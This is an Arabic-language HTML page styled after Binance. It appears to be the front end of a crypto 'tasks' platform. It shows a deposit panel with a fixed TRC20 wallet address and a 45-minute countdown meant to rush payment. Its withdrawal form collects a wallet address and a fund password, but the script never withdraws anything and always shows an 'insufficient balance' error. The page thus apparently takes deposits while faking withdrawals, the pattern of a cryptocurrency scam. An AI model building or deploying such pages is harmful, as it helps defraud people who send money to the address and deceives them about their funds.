<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Any Dream</title>
  <link rel="stylesheet" href="home.css">
  <link rel="stylesheet" href="https://cloudflare.com">
  <style>
    /* التنسيق الجديد لكارت الرصيد الاحترافي الداكن */
    .balance-card {
      background-color: #181a20 !important; /* خلفية داكنة */
      border-radius: 12px;
      padding: 20px;
      margin-bottom: 20px;
      text-align: right; /* محاذاة النص لليمين مثل الصورة */
      box-shadow: none !important;
      border: 1px solid #2b3139;
    }
    .balance-label {
      color: #848e9c !important; /* لون رمادي خفيف للعنوان */
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .balance-label i {
      font-size: 11px;
    }
    .balance-amount {
      color: #ffffff !important; /* لون الرقم أبيض */
      font-size: 32px;
      font-weight: bold;
      margin: 10px 0 5px 0 !important;
      font-family: Arial, sans-serif;
    }
    .balance-stats {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      margin-bottom: 15px;
    }
    .stat-green {
      color: #0ecb81; /* اللون الأخضر للأرباح */
      font-weight: 500;
    }
    .stat-badge {
      background-color: #2b3139;
      color: #eaeded;
      padding: 2px 8px;
      border-radius: 12px;
      font-size: 12px;
    }
    .deposit-trigger-btn {
      width: 100%;
      background-color: #0066ee !important; /* زر أزرق مريح للاستخدام */
      color: white !important;
      border: none;
      padding: 12px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      font-size: 15px;
      transition: background 0.2s;
    }
    .deposit-trigger-btn:hover {
      background-color: #0052cc !important;
    }

    /* تعديل شريط اللودينغ والخط إلى اللون الأزرق الاحترافي */
    .deposit-loading-bar {
      width: 100%;
      background-color: #2b3139;
      height: 4px;
      border-radius: 2px;
      margin-top: 15px;
      overflow: hidden;
    }
    .loading-progress {
      width: 100%;
      background-color: #0066ee !important; /* لودينغ باللون الأزرق */
      height: 100%;
      animation: countdownProgress 2700s linear forwards; /* 45 دقيقة */
    }
    @keyframes countdownProgress {
      from { width: 100%; }
      to { width: 0%; }
    }
    .countdown-timer-box {
      color: #0066ee !important; /* نص وقت طلب الدفع باللون الأزرق */
      font-weight: bold;
      text-align: center;
      margin-top: 10px;
    }
    #timer {
      color: #0066ee !important; /* أرقام العداد باللون الأزرق */
    }
  </style>
</head>
<body>

<div class="withdraw-page-container">
  <!-- بطاقة الرصيد الداكنة الاحترافية الجديدة -->
  <div class="balance-card">
    <div class="balance-label">
      Assets, total <i class="fas fa-chevron-up" style="font-size:8px;"></i><i class="fas fa-chevron-down" style="font-size:8px; margin-right:-3px;"></i>
    </div>
    <h2 class="balance-amount">0.00 USDT</h2>
    
    <!-- إحصائيات اليوم باللون الأخضر مثل صورتك -->
    <div class="balance-stats">
      <span class="stat-green">+0.00 · 0.00%</span>
      <span class="stat-badge">for today</span>
    </div>
    
    <!-- زر شحن الحساب -->
    <button type="button" class="deposit-trigger-btn" onclick="openDepositSection()">
      <i class="fas fa-wallet"></i> شحن الحساب
    </button>
  </div>

  <!-- واجهة الدفع والشحن المحدثة باللون الأزرق -->
  <div id="depositSection" class="deposit-container" style="display: none;">
    <div class="deposit-header">
      <h3>عملية الدفع TRC20</h3>
      <p>يمكنك الشحن من خارج منصات التداول عبر OKX أو Binance</p>
    </div>
    
    <!-- شريط تحميل اللودينغ التنازلي الأزرق -->
    <div class="deposit-loading-bar">
      <div class="loading-progress"></div>
    </div>

    <!-- العداد التنازلي الأزرق -->
    <div class="countdown-timer-box">
      <i class="far fa-clock"></i> ينتهي طلب الدفع خلال: <span id="timer">45:00</span>
    </div>

    <!-- عنوان المحفظة كامل وبدون تقطيع -->
    <div class="address-display-box">
      <span class="address-title">عنوان المحفظة (TRC20):</span>
      <div class="crypto-address" id="walletAddrText">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
      <button type="button" class="copy-btn" onclick="copyAddress()">نسخ العنوان <i class="far fa-copy"></i></button>
    </div>
  </div>

  <!-- نموذج طلب السحب -->
  <form id="withdrawForm" class="withdraw-form" onsubmit="event.preventDefault();">
    <div class="form-group">
      <label class="group-label">الشبكة</label>
      <select class="styled-input" id="networkSelect" required>
        <option value="TRC20">TRC20</option>
      </select>
    </div>

    <div class="form-group">
      <label class="group-label">عنوان المحفظة</label>
      <input type="text" class="styled-input" id="walletAddress" placeholder="أدخل عنوان محفظة TRC20" required>
    </div>

    <div class="form-group">
      <label class="group-label">كلمة مرور الصندوق</label>
      <input type="password" class="styled-input" id="fundPassword" placeholder="أدخل كلمة مرور السحب" required>
    </div>

    <!-- رسالة الخطأ -->
    <div id="errorMessage" class="error-toast-message">
      <i class="fas fa-exclamation-circle"></i> عذراً، رصيدك الحالي غير كافٍ لإتمام عملية السحب.
    </div>

    <button type="button" onclick="handleWithdraw()" class="withdraw-submit-btn">سحب الأموال</button>
  </form>
</div>

<!-- شريط التنقل السفلي الاحترافي على طريقة بايننس -->
<div class="binance-bottom-nav">
  <a href="account.html" class="binance-nav-item">
    <i class="fas fa-user"></i>
    <span>حسابي</span>
  </a>
  <a href="tasks.html" class="binance-nav-item">
    <i class="fas fa-list-ul"></i>
    <span>المهام</span>
  </a>
  <a href="assets.html" class="binance-nav-item">
    <i class="fas fa-wallet"></i>
    <span>الأصول</span>
  </a>
  <a href="home.html" class="binance-nav-item current-active">
    <i class="fas fa-home"></i>
    <span>الرئيسية</span>
  </a>
</div>
 
<script>
let timerInterval;

function openDepositSection() {
  const depositDiv = document.getElementById('depositSection');
  depositDiv.style.display = 'block';
  clearInterval(timerInterval);
  startCountdown(45 * 60);
  depositDiv.scrollIntoView({ behavior: 'smooth' });
}

function startCountdown(duration) {
  let timer = duration, minutes, seconds;
  const display = document.getElementById('timer');
  timerInterval = setInterval(function () {
    minutes = parseInt(timer / 60, 10);
    seconds = parseInt(timer % 60, 10);
    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;
    display.textContent = minutes + ":" + seconds;
    if (--timer < 0) {
      clearInterval(timerInterval);
      display.textContent = "منتهي";
    }
  }, 1000);
}

function copyAddress() {
  const addrText = document.getElementById('walletAddrText').innerText;
  navigator.clipboard.writeText(addrText).then(() => {
    alert("تم نسخ عنوان المحفظة بنجاح!");
  });
}

function handleWithdraw() {
  const address = document.getElementById('walletAddress').value.trim();
  const password = document.getElementById('fundPassword').value.trim();
  const errorDiv = document.getElementById('errorMessage');

  if (address === "" || password === "") {
      alert("يرجى ملء جميع الحقول المطلوبة أولاً.");
      return;
  }
  errorDiv.style.display = 'flex';
  setTimeout(() => {
      errorDiv.style.display = 'none';
  }, 5000);
}
</script>

</body>
</html>
